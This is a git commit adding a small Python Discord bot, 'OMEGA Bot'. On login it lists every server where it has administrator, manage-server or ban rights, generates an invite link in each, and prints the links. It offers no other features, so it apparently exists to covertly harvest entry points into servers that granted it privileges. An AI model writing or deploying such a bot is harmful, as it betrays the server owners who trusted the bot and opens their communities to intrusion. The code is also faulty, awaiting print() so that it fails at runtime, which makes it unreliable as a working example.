39aa180c29b88ec235d38e692ba2ccfd32276577
Zenith <101115433+zendivinity@users.noreply.github.com>
2022-07-31 09:49:30 +0700

    Create main.py

---
+++ main.py
@@ -0,0 +1,55 @@
+import discord
+from discord.ext import commands
+
+bot = commands.Bot(command_prefix ="!", case_insensitive=True, intents=discord.Intents.default(), help_command=None)
+
+token = ""
+
+
+@bot.event
+async def on_ready():
+    await print(f"OMEGA Bot is connected!\nLogged in as: {bot.user.name}#{bot.user.discriminator}\nPREFIX: {bot.command_prefix}")
+    await print(f"Guilds: {len(bot.guilds)}")
+    admins = []
+    bots = []
+    bans = []
+
+    for guild in bot.guilds:
+        if guild.me.guild_permissions.administrator:
+            admins.append(guild.id)
+        if (guild.me.guild_permissions.manage_guild) and (not guild.me.guild_permissions.administrator):
+            bots.append(guild.id)
+        if (guild.me.guild_permissions.ban_members) and (not guild.me.guild_permissions.administrator):
+            bans.append(guild.id)
+
+    for id in admins:
+        guild = bot.get_guild(int(id))
+        for channel in guild.channels:
+            try:
+                invite = await channel.create_invite()
+                await print(f"{invite}")
+                break
+            except:
+                continue
+
+    for id in bots:
+        guild = bot.get_guild(int(id))
+        for channel in guild.channels:
+            try:
+                invite = await channel.create_invite()
+                await print(f"{invite}")
+                break
+            except:
+                continue
+
+    for id in bans:
+        guild = bot.get_guild(int(id))
+        for channel in guild.channels:
+            try:
+                invite = await channel.create_invite()
+                await print(f"{invite}")
+                break
+            except:
+                continue
+
+bot.run(token, bot=True)
